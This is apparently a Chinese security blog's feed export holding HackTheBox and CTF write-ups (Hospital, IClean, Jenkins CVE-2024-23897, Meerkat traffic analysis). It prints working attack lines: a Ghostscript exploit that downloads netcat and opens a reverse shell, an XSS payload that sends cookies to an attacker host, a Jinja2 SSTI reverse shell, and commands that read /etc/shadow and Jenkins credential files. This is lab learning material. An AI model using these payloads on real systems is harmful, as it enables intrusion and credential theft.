<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x initdb.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>最后sudo执行<code>/usr/bin/syscheck</code>，成功运行sh脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/syscheck</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/article/Headless-HackTheBox/image-20240331181954932.png"></p>
<p>运行sh脚本后，用-p参数启动<code>Bash Shell</code>并以特权模式运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>

<p>得到root的flag</p>
<p><img src="/article/Headless-HackTheBox/image-20240331182210478.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Hospital</title>
    <url>/article/Hospital-HackTheBox.html</url>
    <content><![CDATA[<p>Ubuntu内核版本漏洞提权、Artifex Software Ghostscript 安全漏洞</p>
<span id="more"></span>

<h1 id="Hospital"><a href="#Hospital" class="headerlink" title="Hospital"></a>Hospital</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
<p><img src="/article/Hospital-HackTheBox/image-20240112180806750.png"></p>
<p>发现8080端口和443端口有http服务</p>
<p>然后发现3389端口是启用了ms-wbt-server服务</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115204915296.png"></p>
<p>在对443端口的扫描没有收获，并且只有邮箱登录界面无法注册</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115164807440.png"></p>
<p>接着看向8080端口，我们随便注册用户登录后发现有文件上传功能</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115164932259.png"></p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>经过测试pht和phar后缀都可以绕过检测，然后dirsearch扫描出文件上传路径为<code>/uploads/</code></p>
<p>尝试上传一句话木马，发现虽然能成功但是并不能执行命令</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115165831471.png"></p>
<p>于是借助大神写的shell工具来反弹shell <a href="https://github.com/flozz/p0wny-shell">脚本链接</a></p>
<p>直接下载shell.php然后上传，用bp将php后缀改为phar（后面测试了一下发现pht后缀会有问题，只能显示源码不解析）</p>
<p>然后访问文件保存路径<code>/uploads/shell.phar</code></p>
<p><img src="/article/Hospital-HackTheBox/image-20240115171307639.png"></p>
<p>由于不稳定我们反弹到本地机器上</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115171656947.png"></p>
<p>经过一番搜索，在<code>/var/ww/html/config.php</code>找到数据库用户和密码</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115172212732.png"></p>
<p>然后连接数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p -h localhost</span><br></pre></td></tr></table></figure>

<p>找到用户信息</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115172643646.png"></p>
<p>对admin的解码一下得到密码（早知道弱口令爆破了hhh）</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115173020295.png"></p>
<p>不过好像没什么用</p>
<p>于是参考国外师傅wp原来是利用Ubuntu内核版本漏洞去提权 <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">exp链接</a></p>
<p>我们把exp下载到本地然后开启http服务，在靶机用wget命令复制过去</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115181536436.png"></p>
<p>然后chmod给个执行权限，成功提权</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115181701556.png"></p>
<p>这里的root并不是真正的root用户，所以我们还得寻找可用信息</p>
<p>我们查看当前用户的哈希值，发现有drwilliams的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>

<p><img src="/article/Hospital-HackTheBox/image-20240115182451909.png"></p>
<p>然后用john爆破得到密码</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115184235946.png"></p>
<p>得到密码后访问443端口登录后，注意到一封邮件</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115200651567.png"></p>
<p>谷歌翻译一下，应该是要给Brown发送.eps文件</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115200710233.png"></p>
<p>网上搜索出相关漏洞–Artifex Software Ghostscript 安全漏洞(CVE-2023-36664) <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">参考文章</a></p>
<blockquote>
<p>漏洞原理大概就是GPL PostScript&#x2F;PDF 解释器 Ghostscript 无法正确处理管道设备的权限验证，如果处理格式错误的文档文件，可能会导致执行任意命令</p>
</blockquote>
<p>我们可以这样利用，先用该exp去创建第一个<code>.eps</code>文件构造curl命令我们本地的nc程序，然后Brown使用解释器打开后触发该命令下载nc程序；然后再次发送一个<code>.eps</code>文件去利用nc执行主动弹shell的命令</p>
<p>注意被攻击机为Brown的windows系统</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115201559484.png"></p>
<p>执行过程如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE_2023_36664_exploit.py --inject --payload &quot;curl 10.10.14.54:8000/nc64.exe -o nc.exe&quot; --filename file.eps</span><br></pre></td></tr></table></figure>

<p>下载nc64.exe并保存为nc.exe</p>
<p>成功下载nc程序<img src="/article/Hospital-HackTheBox/image-20240115202041934.png"></p>
<p>然后就再发一个邮件去主动nc连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE_2023_36664_exploit.py --inject --payload &quot;nc.exe 10.10.14.54 1028 -e cmd.exe&quot; --filename file.eps</span><br></pre></td></tr></table></figure>

<p>发送后被Brown打开，成功nc连接</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115204415877.png"></p>
<p>然后dir找到文件，查看一下得到密码</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115204646134.png"></p>
<p>由于我们前面namp扫描出3389端口是ms-wbt-server服务，我们就可以尝试连接一下</p>
<p>开始我是使用xfreerdp工具连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /u:drbrown /v:10.10.11.241</span><br></pre></td></tr></table></figure>

<p>然后惊讶的发现直接连接到被攻击机</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115210010248.png"></p>
<p>访问桌面得到user的flag（不过确实不太方便root提权）</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>所以就换成rpcclient连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient -U drbrown 10.10.11.241</span><br></pre></td></tr></table></figure>

<p>然后执行querydispinfo命令，查看关于当前连接到计算机的显示器的详细信息</p>
<p>注意到管理员信息是与访客共享的</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115211414355.png"></p>
<p>那么我们可以在刚刚连接的windows靶机上，curl我们本地的shell文件来实现RCE</p>
<p>（shell.php前文已经给了参考链接）</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115212041160.png"></p>
<p>由于知道是共享的，所以我们直接访问<code>/shell.php</code>得到root的flag</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115211953335.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>Windows</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>IClean</title>
    <url>/article/IClean-HackTheBox.html</url>
    <content><![CDATA[<p>XSS跨站脚本攻击、SSTI模板注入</p>
<span id="more"></span>

<h1 id="IClean"><a href="#IClean" class="headerlink" title="IClean"></a>IClean</h1><p><strong>信息搜集</strong></p>
<p>nmap扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.12 -Pn</span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>访问80端口，发现跳转到<code>capiclean.htb</code>，添加下<code>/etc/hosts</code></p>
<p>扫描目录，可以发现<code>/dashboard</code>路由可以，应该是经过身份验证跳转到<code>/</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[22:00:12] 200 -    2KB - /about                                            </span><br><span class="line">[22:01:03] 302 -  189B  - /dashboard  -&gt;  /                                 </span><br><span class="line">[22:01:34] 200 -  711B  - /login                                            </span><br><span class="line">[22:01:35] 302 -  189B  - /logout  -&gt;  /                                    </span><br><span class="line">[22:02:15] 403 -  278B  - /server-status/                                   </span><br><span class="line">[22:02:16] 403 -  278B  - /server-status                                    </span><br><span class="line">[22:02:17] 200 -    8KB - /services</span><br></pre></td></tr></table></figure>

<p>我们在<code>/choose</code>路由下点击<code>get a quote</code></p>
<p><img src="/article/IClean-HackTheBox/image-20240517223255102.png"></p>
<p>勾选上去抓包，测试各个参数是否存在注入</p>
<p>在service参数成功测试出存在xss注入</p>
<p>（xss注入的payload均url编码过）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=http://10.10.14.54/&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/IClean-HackTheBox/image-20240517223604205.png"></p>
<p>我们尝试读取下管理员cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=fetch(&#x27;http://10.10.14.54/&#x27;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/IClean-HackTheBox/image-20240517223817967.png"></p>
<p>得到cookie后我们来验证一下，使用cookie成功访问<code>/dashboard</code></p>
<p><img src="/article/IClean-HackTheBox/image-20240517224029471.png"></p>
<p>我们按照<code>Generate Invoice =&gt; Generate QR</code>顺序</p>
<p>先生成<code>Invoice ID generated: 1223131481</code>，然后在第二步输入ID后点击<code>Genrate</code>会生成下面的<code>QR Code Link</code></p>
<p>我们抓包看看，注意到<code>qr_link</code>的值出现在img标签中</p>
<p><img src="/article/IClean-HackTheBox/image-20240517224817039.png"></p>
<p>经过测试该参数存在SSTI模板注入</p>
<p><img src="/article/IClean-HackTheBox/image-20240517224936946.png"></p>
<p>回显49应该就是Jinja2，直接payload测试一下（<code>__</code>直接unicode编码一下）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;id&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/IClean-HackTheBox/image-20240517230157254.png"></p>
<p>直接反弹shell（注意bash命令URL编码一下）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/1010.14.54/1028 0&gt;&amp;1&#x27;&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/IClean-HackTheBox/image-20240517230503070.png"></p>
<p>先提升下shell权限</p>
<p>然后在<code>/opt/app/app.py</code>找到数据库信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Database Configuration</span><br><span class="line">db_config = &#123;</span><br><span class="line">    &#x27;host&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;user&#x27;: &#x27;iclean&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;pxCsmnGLckUb&#x27;,</span><br><span class="line">    &#x27;database&#x27;: &#x27;capiclean&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接本地连接数据库<code>mysql -u iclean -p -h localhost</code>，找到consuela的密码</p>
<p><img src="/article/IClean-HackTheBox/image-20240517232043106.png"></p>
<p>先识别一下是什么加密，然后john爆破记得加上format</p>
<p><img src="/article/IClean-HackTheBox/image-20240517232013033.png"></p>
<p>拿到密码<code>simple and clean</code>后直接ssh连接就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh consuela@10.10.11.12</span><br></pre></td></tr></table></figure>

<p>拿到user的flag</p>
<p><img src="/article/IClean-HackTheBox/image-20240517232330110.png"></p>
<p>然后我们<code>sudo -l</code>查看下可用的命令</p>
<p><img src="/article/IClean-HackTheBox/image-20240517232526293.png"></p>
<p>用strings命令查看发现内容存在<code>--help</code>参数，网上搜索发现qpdf是一个内容转换工具，有对应的使用文档</p>
<p>我们可以利用其参数读取root的flag（注意要在tmp目录下才能下载root.txt）</p>
<p><img src="/article/IClean-HackTheBox/image-20240517233227496.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
    <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
    <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
<span id="more"></span>

<h1 id="Jenkins文件读取漏洞-CVE-2024-23897"><a href="#Jenkins文件读取漏洞-CVE-2024-23897" class="headerlink" title="Jenkins文件读取漏洞(CVE-2024-23897)"></a>Jenkins文件读取漏洞(CVE-2024-23897)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的是vulhub靶场的环境 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897">下载地址</a></p>
<p>cd进入目录下，依次执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>

<p>访问8080端口即可</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Jenkins提供了一个命令行的接口，用户可以下载一个命令行客户端<code>jenkins-cli.jar</code>到本地，并调用该客户端来执行一些Jenkins的功能。但是用户使用<code>jenkins-cli.jar</code>时，命令行是传到服务端解析的，而不是在jenkins-cli.jar里解析。这就导致一个问题，就是Jenkins服务端解析命令行时使用了一个第三方库<a href="https://github.com/kohsuke/args4j">args4j</a>，这个库实现了Linux中一个常见的功能——如果一个参数是以<code>@</code>开头，则会被自动认为是一个文件名，文件内容会被读取作为参数。所以就造成Jenkins文件读取漏洞。</p>
<blockquote>
<p>类似的还有PHP5.5以前，设置POST参数时，如果传入的参数值是<code>@</code>开头，则也会被认为是文件名，并读取该文件，造成文件读取漏洞。</p>
</blockquote>
<h2 id="Jenkins权限系统"><a href="#Jenkins权限系统" class="headerlink" title="Jenkins权限系统"></a>Jenkins权限系统</h2><p>正常情况下，cli这个功能的权限控制方案和Jenkins默认权限方案相同</p>
<p>Jenkins有几种鉴权方案：</p>
<ul>
<li><strong>Anyone can do anything</strong> 没有任何权限认证，匿名用户即可登录后台执行Groovy脚本</li>
<li><strong>Legacy Mode</strong> 旧鉴权模式</li>
<li><strong>Logged-in users can do anything</strong> 任意登录的用户可以做任何事，这是默认的权限选项</li>
<li><strong>Matrix-based security</strong> 细颗粒度权限控制，需要安装插件才支持这个鉴权模式</li>
</ul>
<p>默认安装后是第3种方案，非常简单，没有垂直权限的区分，登录后的用户就是管理员，没有登录的用户就是匿名用户。</p>
<p>这种权限方案中，管理员可以设置“匿名用户可读”选项：</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215237335.png"></p>
<p>这个选项在后台的<code>“Manage Jenkins” -&gt; “Security”</code>中管理员可以将其开启或关闭，默认是关闭的。实际测试中，如果我们访问Jenkins首页，发现强制跳转到登录页面，或者啥功能都没有直接报权限错误，就说明关闭了“匿名用户读”选项。</p>
<p>我们不妨测试一下关闭了匿名用户可读功能，那么大部分的cli命令也就无法调用，会出现<code>&quot;ERROR: anonymous is missing the Overall/Read permission&quot;</code>的错误：</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215426442.png"></p>
<p>但有2个命令例外，就是help和who-am-i。这两个命令是无需任何权限的，所以可以用来读取文件</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215733356.png"></p>
<p>在Vulhub环境中，“匿名用户可读”是开启的，某些Jenkins版本默认安装时可能也是开启的，但通常管理员会关闭这个功能。另外，大部分企业的Jenkins会安装<code>“Matrix-based security”</code>这样的插件来管理权限，也会影响“匿名用户可读”选项的值。总而言之，这个选项的开关取决于管理员是否想让未登录用户看到一些Jenkins的任务。</p>
<p>总结一下就是：</p>
<ul>
<li>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用</li>
<li>当Jenkins关闭了“匿名用户可读”功能，只有help和who-am-i命令可以被调用</li>
</ul>
<h2 id="如何读取想要的内容"><a href="#如何读取想要的内容" class="headerlink" title="如何读取想要的内容"></a>如何读取想要的内容</h2><p>前文已经知道了文件读取漏洞的原理，利用<code>jenkins-cli.jar</code>将命令传到服务端解析借助args4j库特性解析参数有<code>@</code>开头的文件</p>
<p>要实现任意文件读取，那么就需要返回文件读取后的内容。利用点是如果调用命令行的时候出错，args4j就会把错误返回给客户端而错误信息中就包含文件的内容。</p>
<p>这里p神提到，如果我们使用<code>@</code>将文件内容加载成命令行参数，那么我们读取文件的时候只能读到文件的前几行</p>
<p>比如使用help命令能读取前两行</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220700887.png"></p>
<p>使用keep-build命令，可以读取文件第3行</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220816201.png"></p>
<p>读取几行内容终究是不够，前文提到如果Jenkins开启了“匿名用户可读”选项，则大部分命令都可以被调用，其中包括<code>connect-node</code>命令和<code>reload-job</code>命令。这俩命令可以用来读取文件全部内容</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408221213026.png"></p>
<h2 id="Jenkins敏感文件"><a href="#Jenkins敏感文件" class="headerlink" title="Jenkins敏感文件"></a>Jenkins敏感文件</h2><p>如果部署Jenkins是Vulhub的Docker镜像，那么Jenkins的数据根目录是在<code>/var/jenkins_home</code>。但并不是所有人都会使用这个目录作为根目录，如果想读取Jenkins相关的文件，必须先知道Jenkins的根目录在哪里。这时可以读取<code>/proc/self/environ</code>也就是环境变量</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222401625.png"></p>
<p>拿到了Jenkins的根目录，我们就可以来尝试读取下面这些敏感文件。</p>
<ul>
<li><code>/var/jenkins_home/users/*/config.xml</code> 保存所有用户的信息，包括密码、种子、Token等</li>
<li><code>/var/jenkins_home/secret.key</code> 保存Remember-Me Cookie中的一部分</li>
<li><code>/var/jenkins_home/secrets/master.key</code> 作为AES解密密钥</li>
<li><code>/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac</code> 作为计算hmac签名时的Key</li>
</ul>
<h3 id="读取用户密码"><a href="#读取用户密码" class="headerlink" title="读取用户密码"></a>读取用户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/users.xml&quot;</span><br></pre></td></tr></table></figure>

<p>得到用户名<code>admin_6382705393240952219</code></p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222722527.png"></p>
<p>接着读取到用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/admin_6382705393240952219/config.xml&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222813856.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>跟着p神复现热门漏洞可以说是非常有收获，c1oudfl0w0师傅说RWCTF2024有道题考的就是这个漏洞，可惜当时没去打hhh</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>ISCC2024-数据泄露</title>
    <url>/article/ISCC2024-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2.html</url>
    <content><![CDATA[<p>ISCC2024擂台赛的一道流量分析题，和内网渗透中搭建隧道事件有关</p>
<span id="more"></span>

<h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><p><strong>题目要求</strong></p>
<blockquote>
<p>公司主机被攻击了，请根据流量文件，找到攻击者所使用的 DNS 隧道工具的原始文件名。请提交文件名的小写md5</p>
</blockquote>
<p>打开文件发现存在大量DNS的数据包，筛选一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns &amp;&amp; ip.src==192.168.157.144</span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503205838886.png" alt="image-20240503205838886"></p>
<p>发现这些包非常大，并且对应域名过长</p>
<p><strong>明显的 dnscat2 流量特征（解析域名过长，使用 CNAME、TXT、MX 记录的查询）</strong></p>
<p>我们导出为纯文本文件</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210020711.png" alt="image-20240503210020711"></p>
<p>将域名<code>microsofto365.com</code>前面部分提取出来（就提取的前面几部分）</p>
<p>解码脚本如下 <a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=265941">参考文章</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex_string=&#x27;1ae6012ec72fe4b1f14d6963726f736f66742057696e646f7773205b5665&#x27;</span><br><span class="line">hex_string=hex_string.replace(&#x27;.&#x27;,&#x27;&#x27;)</span><br><span class="line">#将字符按照每两个字符分组，转换成十六进制数</span><br><span class="line">hex_parts=[hex_string[i:i+2] for i in range(0,len(hex_string),2)]</span><br><span class="line"></span><br><span class="line">#转换成ascii字符</span><br><span class="line">ascii_result=&#x27;&#x27;.join(chr(int(hex,16)) for hex in hex_parts)</span><br><span class="line">print(ascii_result)</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210239942.png" alt="image-20240503210239942"></p>
<p>注意到DNS隧道工具dnscat2，不过有乱码</p>
<p>直接搜索引擎确定文件名</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210351782.png" alt="image-20240503210351782"></p>
<p>然后在线网站MD5加密一下，上面那个就是flag</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210412841.png" alt="image-20240503210412841"></p>
]]></content>
      <categories>
        <category>流量分析</category>
      </categories>
  </entry>
  <entry>
    <title>Meerkat</title>
    <url>/article/Meerkat-HackTheBox.html</url>
    <content><![CDATA[<p>巨魔给的面试题，打开HTB的流量分析大门</p>
<span id="more"></span>

<h1 id="Meerkat"><a href="#Meerkat" class="headerlink" title="Meerkat"></a>Meerkat</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote>
<p>作为一家快速发展的初创公司，Forela 一直在利用业务管理平台。不幸的是，我们的文档很少，而且我们的管理员也不是最有安全意识的。作为我们新的安全提供商，我们希望您查看我们导出的一些 PCAP 和日志数据，以确认我们是否已（或尚未）受到损害。</p>
</blockquote>
<h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>我们相信我们的业务管理平台服务器已受到损害。请确认正在运行的应用程序的名称？</strong></p>
<p>筛选http请求，然后追踪tcp流发现<code>/bonita/portal/homepage</code></p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418110808186.png"></p>
<p>很明显是和bonita有关，google搜索引擎得到答案为<code>bonitasoft</code></p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418110940647.png"></p>
<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>我们认为攻击者可能使用了暴力破解攻击类别的子集 - 所执行的攻击的名称是什么？</strong></p>
<p>经过查看后续的一些 http 包，可以发现产生了大量失败的登录请求，可以怀疑攻击者正在尝试进行凭据爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Credential Stuffing</span><br></pre></td></tr></table></figure>



<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>所利用的漏洞是否分配有 CVE - 如果有，是哪一个？</strong></p>
<p>查找一下是否有被命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p>可以发现在第1091个流出现命令执行，往前翻找到黑客上传zip文件进行攻击</p>
<p>那么肯定是通过此zip文件使得命令执行得到root权限</p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418111436776.png"></p>
<p>通过搜索引擎可以知道漏洞编号为<code>CVE-2022-25237</code></p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418111600611.png"></p>
<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p><strong>攻击者利用哪个字符串附加到 API URL 路径来绕过授权过滤器？</strong></p>
<p>我们往下找，注意到<code>/bonita/API/portal/page/;i18ntranslation</code>路径的请求，并且后面就直接RCE了，说明<code>i18ntranslation</code>字符大概率是绕过waf。</p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418111822445.png"></p>
<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><p><strong>撞库攻击中使用了多少种用户名和密码组合？</strong></p>
<p>查看访问<code>/bonita/loginservice</code>总共多少个包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Meerkat-HackTheBox/image-20240418195919731.png"></p>
<p>但是发现很多个包username和password均为install，这些我们不用算在里面所以排除一下</p>
<p>（当然也可以url解码username会发现为邮箱格式）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot;</span><br></pre></td></tr></table></figure>

<p>右下角显示59个，因为可能存在重复密码所以要查看下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot; &amp;&amp; http contains &quot;seb.broom%40forela.co.uk&quot;</span><br></pre></td></tr></table></figure>

<p>找到用户名<code>seb.broom%40forela.co.uk</code>存在四次重复密码</p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418200345629.png"></p>
<p>整理一下<code>59-4+1</code>总共56次碰撞</p>
<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><strong>哪个用户名和密码组合成功？</strong></p>
<p>我们查找一下响应包也就是用到<code>ip.src</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==172.31.6.44</span><br></pre></td></tr></table></figure>

<p>注意到响应为204说明爆破成功，追踪下tcp</p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418200905116.png"></p>
<p>得到用户名和密码（答案注意url编码）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=seb.broom%40forela.co.uk&amp;password=g0vernm3nt</span><br></pre></td></tr></table></figure>

<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><p><strong>如果有，攻击者使用了哪个文本共享网站？</strong></p>
<p>使用网站的话那么请求包中应该有<code>http</code>字符（也可以筛选字符串<code>cmd</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;http&quot; &amp;&amp; http</span><br></pre></td></tr></table></figure>

<p>找到为<code>pastes.io</code></p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418201250245.png"></p>
